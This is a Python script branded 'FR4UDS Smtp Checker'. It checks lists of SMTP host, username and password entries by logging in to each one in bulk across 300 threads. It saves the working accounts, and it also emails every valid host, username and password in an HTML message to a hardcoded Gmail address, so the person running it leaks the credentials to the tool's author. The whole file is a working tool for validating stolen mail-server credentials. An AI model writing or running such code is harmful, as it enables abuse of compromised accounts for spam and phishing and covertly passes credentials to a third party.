import os
import smtplib
import concurrent.futures
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys
import time

class bcolors:
    OK = '\033[92m'  # GREEN
    WARNING = '\033[93m'  # YELLOW
    FAIL = '\033[91m'  # RED
    RESET = '\033[0m'  # RESET COLOR
    banner = """
    ───────────────▄▄───▐█ 
    ───▄▄▄───▄██▄──█▀───█─▄
    ─▄██▀█▌─██▄▄──▐█▀▄─▐█▀ 
    ▐█▀▀▌───▄▀▌─▌─█─▌──▌─▌
    ▌▀▄─▐──▀▄─▐▄─▐▄▐▄─▐▄─▐▄ 
    {https://t.me/FR4UDS}
    """


VALIDS = 0
INVALIDS = 0

toaddr = "moetazbusiness@gmail.com"


def check(smtp):
    HOST, PORT, usr, pas = smtp.strip().split('|')
    global VALIDS, INVALIDS
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "CHECKER RESULT : v1"
        msg['From'] = usr
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>New Smtp</title>
            <style>
                @media only screen and (max-width: 600px) {
                    .inner-body {
                        width: 100% !important;
                    }
            
                    .footer {
                        width: 100% !important;
                    }
                }
            
                @media only screen and (max-width: 500px) {
                    .button {
                        width: 100% !important;
                    }
                }
                .container{
                    background-color:white;
                    align-items: center;
                }
                a{
                    margin-left: 40%;            
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                    font-weight: bold;
                    font-size: 30px;
                    color: #bbbfc3;
                    text-decoration: none;
        
                }
                .cont2{
                    margin-top: 5px;
                    background-color: #dceadd;
                    width: 100%;
                    height: 300px;
                    border: 0.5px solid #EDEFF2 ;
                    }
                p{
                    margin-top: 40px;
                    margin-left: 10px;
                }
                .cont2 > p{
                    color: gray;
                    font-weight: bold;
                    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                }
            </style>
        
            
        </head>
        <body>
            <div class="container" >
            <a href="https://t.me/FR4UDS">
                FR4UDS Smtp Checker
            </a>
            </div>
            <div class="cont2">
                <p>HOST : """ + HOST + """</p>
                <p>PORT : """ + PORT + """</p>
                <p>USER : """ + usr + """</p>
                <p>PASS : """ + pas + """</p>
        
            </div>
        </body>
        </html>
        """
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + 'SMTP WORK {} '.format(HOST) + bcolors.RESET)
        open('validsmtp.txt', 'a').write(smtp + "\n")
        VALIDS += 1
        os.system("title " + "[+] FR4UDS  - https://t.me/FR4UDS - VALIDS : {} , INVALIDS : {} .".format(VALIDS, INVALIDS))
    except:
        INVALIDS += 1
        print(bcolors.FAIL + 'SMTP NOT WORK {} '.format(smtp) + bcolors.RESET)


for letter in str(bcolors.banner):
    sys.stdout.write(letter)
    time.sleep(.01)

if __name__ == '__main__':
    sites = open(input(bcolors.OK + 'Enter Smtps List :' + bcolors.RESET), 'r').read().splitlines()
    try:
        with concurrent.futures.ThreadPoolExecutor(300) as executor:
            executor.map(check, sites)
    except Exception as e:
        print(e)
